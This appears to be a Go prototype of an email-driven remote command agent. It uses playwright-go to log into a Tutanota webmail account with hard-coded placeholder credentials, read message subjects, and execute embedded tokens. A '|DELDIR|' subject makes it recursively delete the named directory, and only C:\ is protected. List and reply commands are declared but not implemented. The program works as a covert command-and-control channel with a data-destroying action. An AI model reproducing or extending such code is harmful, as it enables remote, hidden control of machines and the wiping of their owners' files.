package main

import (
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/mxschmitt/playwright-go"
)

type actions struct {
	Test    string
	ListDir string
	DelDir  string
	Reply   string
}

func main() {
	actionList := actions{
		Test:    "|TEST TEST TEST",
		ListDir: "|LISTDIR|",
		DelDir:  "|DELDIR|",
		Reply:   "|REPLY||",
	}

	pw, err := playwright.Run()
	if err != nil {
		fmt.Println(err)
		return
	}

	launchOpts := playwright.BrowserTypeLaunchOptions{
		Headless: playwright.Bool(false),
	}

	browser, err := pw.Chromium.Launch(launchOpts)
	if err != nil {
		fmt.Println(err)
		return
	}

	page, err := browser.NewPage()
	if err != nil {
		fmt.Println(err)
		return
	}

	defer closePW(pw, browser)

	pgOpts := playwright.PageGotoOptions{
		WaitUntil: playwright.String("networkidle"),
	}

	_, err = page.Goto(`https://mail.tutanota.com/login`, pgOpts)
	if err != nil {
		fmt.Println(err)
		return
	}

	page.Type(`[type="email"]`, `serviceAccount@tutanota.com`)
	page.Type(`[type="password"]`, `PasswordHere123`)
	page.Click(`[title="Log in"]`)

	page.WaitForSelector("#mail-body")

	page.Click(`.pl-m`)
	page.Click(`.mail-list`)

	subjects, err := page.QuerySelectorAll(".b")
	if err != nil {
		fmt.Println(err)
		return
	}

	if len(subjects) == 0 {
		return
	}

	for _, s := range subjects {
		runCommand(s, page, actionList)
	}

}

func closePW(pw *playwright.Playwright, br playwright.Browser) {
	br.Close()
	pw.Stop()
}

func runCommand(peh playwright.ElementHandle, pg playwright.Page, a actions) error {
	var r string

	subjectText, err := peh.InnerText()
	if err != nil {
		return err
	}

	if strings.Contains(subjectText, "Re:") || strings.Contains(subjectText, "Tutanota") {
		return nil
	}

	if strings.Contains(subjectText, a.Test) {
		r = "Test action complete"
	}

	if strings.Contains(subjectText, a.DelDir) {
		delDir := strings.Split(subjectText, "|")[2]

		protectedDirs := []string{`C:\`}

		for _, dir := range protectedDirs {
			if delDir == dir {
				return fmt.Errorf("Cannot delete protected directory %v", dir)
			}
		}

		err := os.RemoveAll(delDir)
		if err != nil {
			return err
		}

		r = fmt.Sprintf("%v Deleted Successfully", delDir)
	}

	if len(r) > 0 {
		fmt.Printf(r)
		peh.Click()

		for i := 0; i <= 4; i++ {
			mailBody, _ := pg.InnerText("#mail-body")

			if strings.Contains(mailBody, "Loading") {
				time.Sleep(5 * time.Second)
				continue
			}

			break
		}

	}

	return nil
}
